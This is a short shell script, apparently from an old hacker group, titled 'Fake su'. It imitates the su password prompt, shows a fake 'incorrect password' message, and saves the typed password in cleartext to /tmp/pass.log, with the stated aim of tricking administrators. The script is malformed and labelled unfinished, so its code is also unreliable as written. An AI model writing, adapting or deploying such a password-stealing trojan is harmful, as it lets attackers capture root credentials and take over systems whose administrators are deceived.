#!/bin/sh
#
# Sumo.sh - Fake su
# (C) BrainStorm
# [ElectronicSouls] 
#
# Simple script for really
# *stupid* admins ;>
 
echo "Password:";read pass 
if [ $pass = "" ] > .es

echo "su: incorrect password"
echo $pass > /tmp/pass.log

then
rm .es
su
fi

# not finished yet ....

